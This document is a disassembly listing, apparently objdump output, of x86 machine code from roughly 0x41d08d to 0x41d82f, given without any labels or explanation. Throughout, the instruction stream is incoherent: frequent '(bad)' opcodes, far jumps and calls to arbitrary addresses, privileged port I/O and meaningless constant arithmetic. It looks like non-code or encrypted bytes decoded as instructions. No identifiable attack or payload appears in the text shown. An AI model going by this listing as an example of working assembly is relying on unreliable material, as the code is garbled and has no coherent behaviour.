  41d08d:	xor    esi,DWORD PTR [edx-0x45875935]
  41d093:	mov    ds:0x9230388e,eax
  41d098:	rcr    DWORD PTR [ebx+ecx*8-0xe],1
  41d09c:	mov    es,edx
  41d09e:	retf   
  41d09f:	push   esi
  41d0a0:	arpl   WORD PTR [ecx+0x18],di
  41d0a3:	in     al,0x92
  41d0a5:	out    0x84,eax
  41d0a7:	or     BYTE PTR [ecx*8+0x24447142],0x70
  41d0af:	inc    edi
  41d0b0:	cld    
  41d0b1:	daa    
  41d0b2:	dec    esi
  41d0b3:	fidiv  WORD PTR [ebp+0x68]
  41d0b6:	into   
  41d0b7:	pop    ecx
  41d0b8:	inc    esi
  41d0b9:	cmc    
  41d0ba:	aas    
  41d0bb:	mov    ebp,0xfc1294c2
  41d0c0:	mov    eax,0x4d81b87b
  41d0c5:	push   edx
  41d0c6:	push   ecx
  41d0c7:	mov    ebx,0xeb9e88f0
  41d0cc:	push   ebx
  41d0cd:	mov    WORD PTR [ebp-0x65],gs
  41d0d0:	push   cs
  41d0d1:	rcr    BYTE PTR [ecx+0xc35cbf0],1
  41d0d7:	jb     0x41d06c
  41d0d9:	xchg   ebx,eax
  41d0da:	fisub  WORD PTR [ecx+ebx*8-0x30]
  41d0de:	xchg   ebx,eax
  41d0df:	xlat   BYTE PTR ds:[ebx]
  41d0e0:	retf   
  41d0e1:	pop    ss
  41d0e2:	(bad)  
  41d0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0e5:	jl     0x41d11c
  41d0e7:	fsub   DWORD PTR [ebx-0x27]
  41d0ea:	mov    ds:0xb403de7f,eax
  41d0ef:	push   ds
  41d0f0:	sub    al,0x98
  41d0f2:	inc    ebp
  41d0f3:	jns    0x41d100
  41d0f5:	gs mov ch,0xde
  41d0f8:	xor    cl,ah
  41d0fa:	hlt    
  41d0fb:	mov    bh,0x3e
  41d0fd:	cmp    esi,ebx
  41d0ff:	stos   DWORD PTR es:[edi],eax
  41d100:	sbb    DWORD PTR [esi],eax
  41d102:	mov    ch,BYTE PTR [ecx+0x59]
  41d105:	les    ecx,FWORD PTR [edx-0x4f]
  41d108:	cwde   
  41d109:	enter  0x36a5,0x55
  41d10d:	sar    DWORD PTR [eax-0x8],0x6d
  41d111:	xchg   ebp,eax
  41d112:	dec    esp
  41d113:	pop    ebx
  41d114:	ins    BYTE PTR es:[edi],dx
  41d115:	sbb    al,0x63
  41d117:	iret   
  41d118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d119:	xchg   DWORD PTR [ecx-0x22],edx
  41d11c:	and    BYTE PTR [edx-0x4e],dl
  41d11f:	dec    DWORD PTR [ebp-0x76]
  41d122:	mov    al,ds:0x5167c758
  41d127:	adc    al,0x22
  41d129:	push   0x7e
  41d12b:	inc    esi
  41d12c:	dec    ebp
  41d12d:	mov    esp,0x4b7c8215
  41d132:	pusha  
  41d133:	fs mov esp,0x46928e5d
  41d139:	loopne 0x41d11a
  41d13b:	cwde   
  41d13c:	data16 imul bl
  41d13f:	mov    edi,0xc6c61b89
  41d144:	cmc    
  41d145:	loop   0x41d142
  41d147:	jnp    0x41d0d5
  41d149:	pop    es
  41d14a:	push   ebx
  41d14b:	cld    
  41d14c:	jg     0x41d0fc
  41d14e:	sbb    eax,0x774ada51
  41d153:	inc    esp
  41d154:	xchg   esi,eax
  41d155:	shl    BYTE PTR [eax+ebp*4+0x1a29fb6e],0x43
  41d15d:	gs mov ah,al
  41d160:	add    BYTE PTR [eax],bl
  41d162:	add    dh,BYTE PTR [edi+0x37]
  41d165:	shl    BYTE PTR [esi-0x141143ec],0xf0
  41d16c:	xchg   ebx,eax
  41d16d:	or     BYTE PTR [ecx],ah
  41d16f:	outs   dx,BYTE PTR ds:[esi]
  41d170:	or     DWORD PTR [eax],eax
  41d172:	inc    ebx
  41d173:	sbb    ah,BYTE PTR [ecx]
  41d175:	adc    al,BYTE PTR es:[ebp+0x588f03e5]
  41d17c:	push   0xb3c5515
  41d181:	arpl   cx,di
  41d183:	test   BYTE PTR [ebp-0x61],cl
  41d186:	(bad)  
  41d187:	xchg   esp,eax
  41d188:	push   ds
  41d189:	jb     0x41d143
  41d18b:	xor    DWORD PTR [ebx],ecx
  41d18d:	push   edx
  41d18e:	jecxz  0x41d15a
  41d190:	(bad)  
  41d191:	nop
  41d192:	xor    eax,0x2fee6e4
  41d197:	test   DWORD PTR [edx],ecx
  41d199:	push   es
  41d19a:	adc    eax,DWORD PTR [ecx-0x4087cdf8]
  41d1a0:	jmp    0xaba590f1
  41d1a5:	mov    dl,BYTE PTR [edx-0x1d]
  41d1a8:	out    dx,eax
  41d1a9:	pop    edi
  41d1aa:	dec    ecx
  41d1ab:	scas   eax,DWORD PTR es:[edi]
  41d1ac:	aas    
  41d1ad:	inc    ebx
  41d1ae:	mov    ecx,0xfc4619cb
  41d1b3:	mov    edx,0xc40ac752
  41d1b8:	xchg   ecx,eax
  41d1b9:	inc    esp
  41d1ba:	icebp  
  41d1bb:	adc    edx,0x12b85904
  41d1c1:	push   ss
  41d1c2:	inc    esp
  41d1c3:	jns    0x41d1de
  41d1c5:	and    ecx,eax
  41d1c7:	cli    
  41d1c8:	adc    al,0xb8
  41d1ca:	mov    dh,0x5f
  41d1cc:	cdq    
  41d1cd:	sub    BYTE PTR [edi-0x1e],dh
  41d1d0:	pop    ebx
  41d1d1:	call   0xcd543348
  41d1d6:	iret   
  41d1d7:	fnsave [eax+0xfba3813]
  41d1dd:	ja     0x41d188
  41d1df:	jae    0x41d1bc
  41d1e1:	retf   0xaa97
  41d1e4:	and    ch,BYTE PTR [ecx+0x11]
  41d1e7:	mov    al,0xe
  41d1e9:	sti    
  41d1ea:	jp     0x41d18f
  41d1ec:	sub    bh,BYTE PTR [edx]
  41d1ee:	out    dx,al
  41d1ef:	jmp    0x41d1db
  41d1f1:	sar    DWORD PTR [edi],cl
  41d1f3:	dec    esp
  41d1f4:	adc    eax,0x845fbc51
  41d1f9:	fdivr  QWORD PTR [eax+0x2de12ebf]
  41d1ff:	das    
  41d200:	adc    eax,edi
  41d202:	mov    fs,ebx
  41d204:	ror    DWORD PTR [ebx+0x27],1
  41d207:	mov    ds:0xf56c9e6d,eax
  41d20c:	test   al,0x46
  41d20e:	pop    es
  41d20f:	in     eax,0x16
  41d211:	in     al,dx
  41d212:	push   0x6fb01c31
  41d217:	mov    DWORD PTR [edi-0x25],edx
  41d21a:	xchg   ebx,eax
  41d21b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d21c:	push   esi
  41d21d:	jmp    0x6624:0x9d27604e
  41d224:	and    DWORD PTR [ecx],ecx
  41d226:	dec    eax
  41d227:	dec    ecx
  41d228:	(bad)  
  41d229:	mov    ecx,0xe98f23a
  41d22e:	jmp    0x308d:0xa8913c7a
  41d235:	pop    edx
  41d236:	sub    BYTE PTR [ebx-0x10f25d9b],0x33
  41d23d:	loope  0x41d211
  41d23f:	or     eax,0x271cb217
  41d244:	dec    eax
  41d245:	mov    al,0x19
  41d247:	or     esp,DWORD PTR [ecx]
  41d249:	pushf  
  41d24a:	push   ds
  41d24b:	or     eax,0x4cd958a2
  41d250:	adc    al,0xa1
  41d252:	call   0x21c5bf33
  41d257:	fdivr  DWORD PTR [eax]
  41d259:	fwait
  41d25a:	aas    
  41d25b:	xchg   esp,eax
  41d25c:	cmp    DWORD PTR [ebx],edx
  41d25e:	call   0x5d6d042
  41d263:	sub    DWORD PTR [eax+esi*8],ecx
  41d266:	mov    eax,0xcae5d676
  41d26b:	xor    DWORD PTR [ebx+0x181c3688],esi
  41d271:	jmp    0x5bd0:0xe27daf30
  41d278:	add    al,0x7f
  41d27a:	nop
  41d27b:	inc    esi
  41d27c:	sub    al,BYTE PTR [esi]
  41d27e:	out    dx,al
  41d27f:	xor    eax,0xefafe1e7
  41d284:	fnstcw WORD PTR [edi]
  41d286:	push   eax
  41d287:	ins    BYTE PTR es:[edi],dx
  41d288:	sbb    al,0xe0
  41d28a:	mov    BYTE PTR [edi+edx*8-0x1591d31b],ah
  41d291:	push   ebx
  41d292:	sti    
  41d293:	scas   al,BYTE PTR es:[edi]
  41d294:	pop    ebx
  41d295:	out    dx,eax
  41d296:	jb     0x41d2ff
  41d298:	push   esi
  41d299:	push   ecx
  41d29a:	lods   eax,DWORD PTR ds:[esi]
  41d29b:	std    
  41d29c:	rcr    dl,cl
  41d29e:	(bad)
  41d2a2:	push   eax
  41d2a3:	fisttp WORD PTR [ebx+0x64]
  41d2a6:	adc    dl,dl
  41d2a8:	add    DWORD PTR [edx+0x3aec77ec],eax
  41d2ae:	adc    eax,0xde1ab236
  41d2b3:	push   cs
  41d2b4:	ret    0x305a
  41d2b7:	mov    ebp,0x7b190bee
  41d2bc:	aas    
  41d2bd:	sbb    ebp,DWORD PTR [ebx+0x65951760]
  41d2c3:	ss and eax,0x4348e562
  41d2c9:	mov    ds:0x489c9212,eax
  41d2ce:	shl    DWORD PTR [esi+eax*1-0x4f],1
  41d2d2:	in     al,dx
  41d2d3:	daa    
  41d2d4:	cmp    dh,BYTE PTR [ebx+0x4aebae19]
  41d2da:	adc    BYTE PTR [ebx+ecx*2-0x73],ah
  41d2de:	in     eax,0x32
  41d2e0:	inc    ebx
  41d2e1:	mov    dl,0x2f
  41d2e3:	in     eax,dx
  41d2e4:	cli    
  41d2e5:	sub    ebx,DWORD PTR [esi-0x15]
  41d2e8:	jmp    0xefe0afb9
  41d2ed:	shl    ch,1
  41d2ef:	neg    cl
  41d2f1:	repz iret 
  41d2f3:	sbb    al,BYTE PTR [ecx+0x538efea3]
  41d2f9:	mov    ebp,0x70bf54bb
  41d2fe:	jle    0x41d2c0
  41d300:	adc    edi,DWORD PTR [ecx+0x20]
  41d303:	popf   
  41d304:	cmp    dh,ch
  41d306:	mov    al,ds:0xd00d1b7
  41d30b:	jmp    0x41d367
  41d30d:	lea    edi,[esi]
  41d30f:	mov    dl,0xe4
  41d311:	cli    
  41d312:	xchg   esp,eax
  41d313:	mov    ds:0xaaa07325,eax
  41d318:	jmp    0x910bec45
  41d31d:	(bad)  
  41d31e:	div    BYTE PTR [eax]
  41d320:	je     0x41d2a7
  41d322:	js     0x41d2c1
  41d324:	cmp    al,0xcd
  41d326:	mov    esp,0x6cbd988
  41d32c:	test   al,0xa1
  41d32e:	add    cl,BYTE PTR [eax]
  41d330:	into   
  41d331:	stos   BYTE PTR es:[edi],al
  41d332:	push   ds
  41d333:	push   edi
  41d334:	clc    
  41d335:	push   DWORD PTR [edx+0x6bd5c52c]
  41d33b:	ror    DWORD PTR [esi],cl
  41d33d:	stc    
  41d33e:	jmp    0x1c76:0xd6238251
  41d345:	inc    eax
  41d346:	jmp    0x41d32e
  41d348:	push   esi
  41d349:	mov    bh,0x70
  41d34b:	mov    ds:0x6d812b31,al
  41d350:	in     al,dx
  41d351:	pop    es
  41d352:	imul   edi,esi,0x79
  41d355:	pop    ss
  41d356:	and    eax,0xa9e33b7e
  41d35b:	cmp    ebp,DWORD PTR ds:0xa1a5b30b
  41d361:	daa    
  41d362:	ret    0xa177
  41d365:	jbe    0x41d361
  41d367:	push   0x4e
  41d369:	and    al,BYTE PTR [edx]
  41d36b:	push   esp
  41d36c:	mov    dh,dh
  41d36e:	mov    dl,0x59
  41d370:	bound  edx,QWORD PTR [edi+0x4d]
  41d373:	jmp    0x9450:0xa6de1181
  41d37a:	jb     0x41d318
  41d37c:	fwait
  41d37d:	les    ebx,FWORD PTR ds:0x9ee1320a
  41d383:	imul   ecx,DWORD PTR [ecx],0x42d45afe
  41d389:	fsub   DWORD PTR [eax-0x5b8a2a5f]
  41d38f:	dec    eax
  41d390:	aaa    
  41d391:	and    al,0xf0
  41d393:	pop    ebx
  41d394:	out    dx,al
  41d395:	mov    DWORD PTR [eax+ebx*2+0x4e],edi
  41d399:	in     eax,dx
  41d39a:	pop    es
  41d39b:	cwde   
  41d39c:	mov    al,0x40
  41d39e:	hlt    
  41d39f:	mov    cl,0xe6
  41d3a1:	mov    bh,BYTE PTR [ebp+0x1a068bbe]
  41d3a7:	mov    ?,WORD PTR [edx+0xb]
  41d3aa:	std    
  41d3ab:	ins    BYTE PTR es:[edi],dx
  41d3ac:	xchg   DWORD PTR [edx+eiz*2],eax
  41d3af:	sbb    DWORD PTR [edx],0xffffffc7
  41d3b2:	mov    ch,dl
  41d3b4:	or     DWORD PTR [eax+0x6aec8684],ecx
  41d3ba:	shl    ecx,1
  41d3bc:	(bad)  
  41d3bd:	fisub  DWORD PTR [ecx+0x2df69935]
  41d3c3:	or     edx,DWORD PTR [ebx+0x8800c24]
  41d3c9:	adc    esi,DWORD PTR [ecx-0x7b0fb308]
  41d3cf:	pop    eax
  41d3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d1:	jnp    0x41d37b
  41d3d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3d4:	int3   
  41d3d5:	mov    esp,0x1a3383de
  41d3da:	jns    0x41d459
  41d3dc:	icebp  
  41d3dd:	sbb    DWORD PTR [esi+0x2d7c58e],esi
  41d3e3:	into   
  41d3e4:	jb     0x41d372
  41d3e6:	mov    BYTE PTR [edi],al
  41d3e8:	adc    dl,BYTE PTR [eax-0x65f8783]
  41d3ee:	fdiv   QWORD PTR [ecx]
  41d3f0:	push   eax
  41d3f1:	lods   al,BYTE PTR ds:[esi]
  41d3f2:	sbb    al,0x53
  41d3f4:	dec    ebx
  41d3f5:	rol    DWORD PTR [ecx],1
  41d3f7:	ror    ah,cl
  41d3f9:	icebp  
  41d3fa:	iret   
  41d3fb:	xor    ebx,DWORD PTR [eax-0x66]
  41d3fe:	sub    esi,0x3cababaf
  41d404:	aam    0xb9
  41d406:	test   BYTE PTR [ebp-0x31a9ad39],bh
  41d40c:	out    0x2b,eax
  41d40e:	mov    ebx,0xa7516d03
  41d413:	test   eax,0x4d318485
  41d418:	outs   dx,DWORD PTR ds:[esi]
  41d419:	rol    DWORD PTR [edx-0x21b80eb5],cl
  41d41f:	mov    ecx,0x5c7d6184
  41d424:	sub    ecx,ebp
  41d426:	adc    ebx,esp
  41d428:	dec    edx
  41d429:	enter  0xa63c,0x49
  41d42d:	outs   dx,DWORD PTR ds:[esi]
  41d42e:	les    ecx,FWORD PTR [edx]
  41d430:	xchg   bh,bl
  41d432:	jns    0x41d466
  41d434:	mov    al,ds:0x637ab7f7
  41d439:	in     eax,0x16
  41d43b:	ss ins BYTE PTR es:[edi],dx
  41d43d:	out    0x1e,eax
  41d43f:	popa   
  41d440:	push   ds
  41d441:	adc    ch,dl
  41d443:	in     al,0xd3
  41d445:	(bad)  
  41d446:	adc    al,0x7
  41d448:	sub    cl,BYTE PTR [eax+esi*1]
  41d44b:	and    DWORD PTR ds:0x63aa67d5,esp
  41d451:	inc    ebp
  41d452:	dec    BYTE PTR [edx-0x4d]
  41d455:	or     DWORD PTR ds:[ebx],0xffffffaa
  41d459:	xchg   DWORD PTR [eax-0x567057b0],ebp
  41d45f:	fbstp  TBYTE PTR [eax-0x2a717084]
  41d465:	and    DWORD PTR ds:0x9ab4b27b,ebp
  41d46b:	iret   
  41d46c:	and    DWORD PTR [ecx+0x425eb929],0x7f
  41d473:	mov    edi,ds
  41d475:	ror    BYTE PTR [edi-0x16ffd4d5],0x5c
  41d47c:	in     eax,0x8b
  41d47e:	push   ds
  41d47f:	aam    0x73
  41d481:	sub    dh,BYTE PTR [ebx]
  41d483:	jmp    0x3e207a3
  41d488:	pop    es
  41d489:	jge    0x41d47d
  41d48b:	ror    BYTE PTR [eax+0x72c29a50],0xcf
  41d492:	add    eax,0x9147952a
  41d497:	pop    ebp
  41d498:	retf   
  41d499:	add    eax,0xae5a4c36
  41d49e:	mov    edx,0xba182367
  41d4a3:	add    al,0x46
  41d4a5:	pop    edi
  41d4a6:	sub    eax,0x79208328
  41d4ab:	jae    0x41d502
  41d4ad:	xchg   ebx,eax
  41d4ae:	inc    esi
  41d4af:	loop   0x41d4f9
  41d4b1:	daa    
  41d4b2:	jno    0x41d50d
  41d4b4:	mov    ds:0x965a3f82,eax
  41d4b9:	adc    ah,BYTE PTR [eax+0x2232d916]
  41d4bf:	test   eax,0x40b71a7f
  41d4c4:	dec    esi
  41d4c5:	mov    dl,0x25
  41d4c7:	adc    BYTE PTR [ebx-0x286984c8],bl
  41d4cd:	push   eax
  41d4ce:	jbe    0x41d528
  41d4d0:	fs mov edx,0xf20e9cc3
  41d4d6:	cmp    bl,al
  41d4d8:	xchg   edx,eax
  41d4d9:	popa   
  41d4da:	jo     0x41d52e
  41d4dc:	js     0x41d465
  41d4de:	xor    DWORD PTR [ebx+0x4656b1b7],esi
  41d4e4:	fidivr WORD PTR [ebx+ebp*1-0x2ef18c1a]
  41d4eb:	push   ds
  41d4ec:	push   esp
  41d4ed:	xchg   BYTE PTR [eax-0x20f79990],cl
  41d4f3:	(bad)  
  41d4f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4f5:	xor    BYTE PTR ds:0x562fc0e4,ch
  41d4fb:	and    BYTE PTR [ebp+eax*2+0x68960ddd],ah
  41d502:	aas    
  41d503:	sahf   
  41d504:	pop    esi
  41d505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d506:	push   0x75
  41d508:	(bad)  
  41d509:	adc    al,0x7
  41d50b:	or     ch,BYTE PTR [eax-0x40]
  41d50e:	and    eax,0x98e5c8a1
  41d513:	test   eax,0xefa7c951
  41d518:	pusha  
  41d519:	sub    DWORD PTR [edx+0x3],ebx
  41d51c:	jmp    0xe146:0x6fcdb9ee
  41d523:	shl    eax,1
  41d525:	cmp    BYTE PTR [ecx],dh
  41d527:	nop
  41d528:	(bad)  
  41d529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d52a:	cmc    
  41d52b:	pop    edi
  41d52c:	jne    0x41d4ef
  41d52e:	add    eax,0x32e29938
  41d533:	into   
  41d534:	sub    eax,0x2b258f47
  41d539:	fsubr  QWORD PTR [edi-0x512e23a2]
  41d53f:	scas   eax,DWORD PTR es:[edi]
  41d540:	add    eax,0x9471255f
  41d545:	jae    0x41d5c2
  41d547:	rcr    DWORD PTR [ebx],0x77
  41d54a:	inc    edx
  41d54b:	stos   BYTE PTR es:[edi],al
  41d54c:	test   DWORD PTR [ebp+ecx*8-0x42],edx
  41d550:	ds sbb dl,cl
  41d553:	push   ebp
  41d554:	addr16 out 0xfe,eax
  41d557:	aad    0xd1
  41d559:	out    dx,al
  41d55a:	sub    eax,0x733f8dbd
  41d55f:	lea    ebp,[ebx+0x78]
  41d562:	jge    0x41d518
  41d564:	mov    WORD PTR [esi+0x4],gs
  41d567:	and    DWORD PTR [ebp-0x2c],ebx
  41d56a:	lods   al,BYTE PTR ds:[esi]
  41d56b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d56c:	dec    ecx
  41d56d:	and    eax,DWORD PTR ds:0x35e0a23
  41d573:	in     al,dx
  41d574:	sbb    DWORD PTR ds:0xf0b72170,0x7e
  41d57b:	leave  
  41d57c:	pop    esi
  41d57d:	xor    edi,esp
  41d57f:	mov    eax,ds:0x35ae3e5e
  41d584:	dec    eax
  41d585:	inc    ecx
  41d586:	xor    esi,ecx
  41d588:	call   0x9c57:0x98bfff2c
  41d58f:	jl     0x41d563
  41d591:	jns    0x41d51a
  41d593:	sub    bl,BYTE PTR [ebx+0x201e8ad3]
  41d599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d59a:	daa    
  41d59b:	sti    
  41d59c:	outs   dx,DWORD PTR ds:[esi]
  41d59d:	lods   eax,DWORD PTR ds:[esi]
  41d59e:	jbe    0x41d55e
  41d5a0:	imul   ebx,DWORD PTR [edi-0x2fec9c67],0xffffffed
  41d5a7:	mov    ch,0xf
  41d5a9:	(bad)  
  41d5aa:	push   DWORD PTR [ecx]
  41d5ac:	jmp    0xfa3e0cbd
  41d5b1:	push   ebp
  41d5b2:	in     al,dx
  41d5b3:	repz ss mov cl,0x58
  41d5b7:	xchg   ebp,eax
  41d5b8:	punpcklwd mm7,DWORD PTR [ebx+0x7d271eda]
  41d5bf:	jmp    0x50cbb601
  41d5c4:	arpl   WORD PTR [edi-0x7565c452],si
  41d5ca:	je     0x41d569
  41d5cc:	mov    al,0xd9
  41d5ce:	push   edi
  41d5cf:	fs mov esp,0xb91237df
  41d5d5:	adc    DWORD PTR [ebp-0x4db3d132],ecx
  41d5db:	mul    al
  41d5dd:	int    0x1a
  41d5df:	push   ds
  41d5e0:	pop    esi
  41d5e1:	test   ebx,edx
  41d5e3:	ins    BYTE PTR es:[edi],dx
  41d5e4:	jle    0x41d649
  41d5e6:	push   ss
  41d5e7:	sbb    dh,dl
  41d5e9:	dec    edi
  41d5ea:	fcom   QWORD PTR [edx+0x13]
  41d5ed:	xor    BYTE PTR [eax-0x29],ah
  41d5f0:	scas   ax,WORD PTR es:[edi]
  41d5f2:	sub    DWORD PTR [ecx-0x1f],0x34
  41d5f6:	push   edx
  41d5f7:	fwait
  41d5f8:	mov    DWORD PTR [ecx],edi
  41d5fa:	xchg   esp,eax
  41d5fb:	(bad)  
  41d5fc:	or     eax,0x69cbefe9
  41d601:	in     al,dx
  41d602:	call   0x4fd1e510
  41d607:	dec    ecx
  41d608:	adc    DWORD PTR [esi],edx
  41d60a:	popa   
  41d60b:	out    dx,eax
  41d60c:	and    DWORD PTR [ebx+eiz*2],esi
  41d60f:	jbe    0x41d5af
  41d611:	cwde   
  41d612:	sbb    bh,cl
  41d614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d615:	loopne 0x41d696
  41d617:	out    dx,eax
  41d618:	sbb    DWORD PTR [edx+0x286f6a2b],0x4
  41d61f:	inc    esp
  41d620:	jl     0x41d67a
  41d622:	dec    esp
  41d623:	pusha  
  41d624:	nop
  41d625:	jecxz  0x41d68c
  41d627:	in     eax,0xcc
  41d629:	adc    bl,bh
  41d62b:	or     esp,0xffffffee
  41d62e:	xchg   ebx,eax
  41d62f:	repnz mov ds:0x91d86b15,al
  41d635:	add    BYTE PTR [edx+0x5125e486],0x84
  41d63c:	mov    esi,0x94f72846
  41d641:	mov    esi,0x394cf556
  41d646:	clc    
  41d647:	nop
  41d648:	inc    ebp
  41d649:	scas   eax,DWORD PTR es:[edi]
  41d64a:	xlat   BYTE PTR ds:[ebx]
  41d64b:	sbb    edx,ecx
  41d64d:	(bad)
  41d652:	mov    ebp,0xd27fbc5c
  41d657:	stos   DWORD PTR es:[edi],eax
  41d658:	fs (bad) 
  41d65b:	sbb    dl,BYTE PTR [edi-0xc65ee78]
  41d661:	mov    edx,0xebd574d
  41d666:	aaa    
  41d667:	mov    esi,0xbfa70dba
  41d66c:	add    BYTE PTR [edx-0x6b6e990a],al
  41d672:	sbb    eax,0x96bca541
  41d677:	test   bh,0x68
  41d67a:	sub    bl,dh
  41d67c:	xor    BYTE PTR [esi],0x8a
  41d67f:	popf   
  41d680:	and    ecx,esp
  41d682:	inc    ebx
  41d683:	stos   DWORD PTR es:[edi],eax
  41d684:	mov    bh,0xc4
  41d686:	ss pop esp
  41d688:	scas   al,BYTE PTR es:[edi]
  41d689:	jmp    0x41d6cb
  41d68b:	mov    cl,0xc4
  41d68d:	lods   al,BYTE PTR ds:[esi]
  41d68e:	retf   0x3d8e
  41d691:	out    dx,eax
  41d692:	xor    ch,BYTE PTR [eax+0x34f4dfaf]
  41d698:	fidivr WORD PTR [esi]
  41d69a:	mov    ch,0xf7
  41d69c:	and    eax,0x38c43771
  41d6a1:	pop    eax
  41d6a2:	ret    
  41d6a3:	retf   0x93c6
  41d6a6:	sahf   
  41d6a7:	or     BYTE PTR [edi-0x60f14850],cl
  41d6ad:	sti    
  41d6ae:	xchg   ebx,eax
  41d6af:	sub    eax,edi
  41d6b1:	push   cs
  41d6b2:	inc    esp
  41d6b3:	out    dx,al
  41d6b4:	mov    WORD PTR [eax+edi*1],fs
  41d6b7:	mov    ebx,0xe7c0cd8
  41d6bc:	ret    0xfc0a
  41d6bf:	test   al,0x26
  41d6c1:	push   ss
  41d6c2:	cli    
  41d6c3:	mov    eax,ds:0xce3b14c7
  41d6c8:	mov    ebp,0x61a87bf1
  41d6cd:	in     eax,0x15
  41d6cf:	inc    ebp
  41d6d0:	out    dx,al
  41d6d1:	imul   BYTE PTR [eax+0x6e]
  41d6d4:	into   
  41d6d5:	dec    ebp
  41d6d6:	mov    ss,WORD PTR [eax+0x127fa9c2]
  41d6dc:	dec    edx
  41d6dd:	out    dx,al
  41d6de:	mov    ds:0x6d413ce8,eax
  41d6e3:	mov    ah,dh
  41d6e5:	(bad)  
  41d6e6:	dec    eax
  41d6e7:	xchg   ecx,eax
  41d6e8:	or     DWORD PTR [edi-0x1705a757],esp
  41d6ee:	dec    edx
  41d6ef:	xchg   ecx,eax
  41d6f0:	test   eax,0xa7cecba
  41d6f5:	sbb    BYTE PTR [ebp-0x55],cl
  41d6f8:	clc    
  41d6f9:	pop    eax
  41d6fa:	sbb    dh,BYTE PTR [edi+0x62c07edc]
  41d700:	(bad)  
  41d701:	stos   BYTE PTR es:[edi],al
  41d702:	aas    
  41d703:	push   cs
  41d704:	imul   cl
  41d706:	call   0xd7a0feb2
  41d70b:	es xchg edx,eax
  41d70d:	mov    esi,0x9a8e652f
  41d712:	outs   dx,DWORD PTR ds:[esi]
  41d713:	mov    esp,0x9dc7f887
  41d718:	xor    esi,esp
  41d71a:	fcomp  DWORD PTR [esi-0x338e5223]
  41d720:	sub    DWORD PTR [eax],ebp
  41d722:	dec    edx
  41d723:	call   0x32eda5b2
  41d728:	popa   
  41d729:	rcl    BYTE PTR [ecx],1
  41d72b:	in     eax,0x2d
  41d72d:	out    0x1f,eax
  41d72f:	push   es
  41d730:	rol    DWORD PTR [edi+0x1a],cl
  41d733:	xor    esp,esp
  41d735:	jmp    0xd869115c
  41d73a:	mov    ds:0x2026c95f,al
  41d73f:	idiv   BYTE PTR [edi+0x50b647d1]
  41d745:	ins    DWORD PTR es:[edi],dx
  41d746:	addr16 ss add eax,0xb3c1ef4
  41d74d:	les    esp,FWORD PTR [edx-0x34]
  41d750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d751:	jmp    0x41d72c
  41d753:	mov    esi,edi
  41d755:	and    al,0x92
  41d757:	retf   
  41d758:	data16 jne 0x41d772
  41d75b:	fwait
  41d75c:	bound  esp,QWORD PTR [eax-0x67e47788]
  41d762:	es add al,0x6d
  41d765:	xlat   BYTE PTR ds:[ebx]
  41d766:	and    DWORD PTR [ebx-0x16167582],edx
  41d76c:	cs clc 
  41d76e:	(bad)  
  41d76f:	into   
  41d770:	lock aam 0xd8
  41d773:	jmp    0x41d7b1
  41d775:	push   0xffffff97
  41d777:	sbb    cl,bh
  41d779:	pop    ecx
  41d77a:	inc    ebp
  41d77b:	fs cmp eax,0xbc94d96b
  41d781:	(bad)  
  41d783:	sub    al,0x1b
  41d785:	inc    edi
  41d786:	ror    BYTE PTR [bx+si+0x58a0],0xe6
  41d78c:	rcl    BYTE PTR ds:0xa19e80e4,1
  41d792:	into   
  41d793:	out    dx,al
  41d794:	mov    eax,0xe4f809f4
  41d799:	xor    ah,BYTE PTR [edi-0x30]
  41d79c:	add    esp,edx
  41d79e:	mov    ebp,0x9f5c8f4c
  41d7a3:	hlt    
  41d7a4:	push   ss
  41d7a5:	ror    DWORD PTR [esi],1
  41d7a7:	cmp    DWORD PTR [edx+0x1d],esp
  41d7aa:	cmp    al,0x9e
  41d7ac:	(bad)  
  41d7ad:	fnstcw WORD PTR [edi-0x10]
  41d7b0:	mov    esp,0x50971c18
  41d7b5:	inc    edx
  41d7b6:	ficomp WORD PTR [ebx+0x2e]
  41d7b9:	es shl bl,0x7d
  41d7bd:	pop    ebp
  41d7be:	sahf   
  41d7bf:	pop    edi
  41d7c0:	mov    al,0xec
  41d7c2:	dec    edx
  41d7c3:	xor    edi,DWORD PTR [ebp-0x4e]
  41d7c6:	fisub  WORD PTR [eax-0x11]
  41d7c9:	scas   al,BYTE PTR es:[edi]
  41d7ca:	inc    ecx
  41d7cb:	shl    DWORD PTR [eax-0x582bc09],0xd5
  41d7d2:	out    dx,al
  41d7d3:	imul   edx,DWORD PTR [eax+0x6626c61e],0x4508427c
  41d7dd:	and    DWORD PTR [ecx+0x4f5d183a],edi
  41d7e3:	loope  0x41d7e7
  41d7e5:	push   esi
  41d7e6:	dec    ebp
  41d7e7:	inc    ebx
  41d7e8:	push   eax
  41d7e9:	pop    edx
  41d7ea:	jb     0x41d7dd
  41d7ec:	ins    DWORD PTR es:[edi],dx
  41d7ed:	add    al,BYTE PTR [eax-0x6c]
  41d7f0:	loop   0x41d7cb
  41d7f2:	pop    edi
  41d7f3:	inc    edi
  41d7f4:	dec    esi
  41d7f5:	push   ebx
  41d7f6:	sbb    al,0xe6
  41d7f8:	cld    
  41d7f9:	sbb    DWORD PTR [edi],edi
  41d7fb:	int    0x7b
  41d7fd:	stos   BYTE PTR es:[edi],al
  41d7fe:	loop   0x41d82d
  41d800:	rcr    DWORD PTR [edi+0x148687e6],0x57
  41d807:	lea    ebp,fs:[eax+0x34]
  41d80b:	inc    eax
  41d80c:	push   esi
  41d80d:	fxch   st(5)
  41d80f:	nop
  41d810:	sbb    eax,0x80e5b0f0
  41d815:	test   eax,0x7078bd1b
  41d81a:	fldenv [eax]
  41d81c:	ret    
  41d81d:	sub    ebx,DWORD PTR gs:[edi-0x1edb2b9e]
  41d824:	xor    al,0xcd
  41d826:	je     0x41d821
  41d828:	or     DWORD PTR [esp+edx*2-0x63],ebp
  41d82c:	cmp    BYTE PTR [ebp-0x3c],dl
  41d82f:	nop
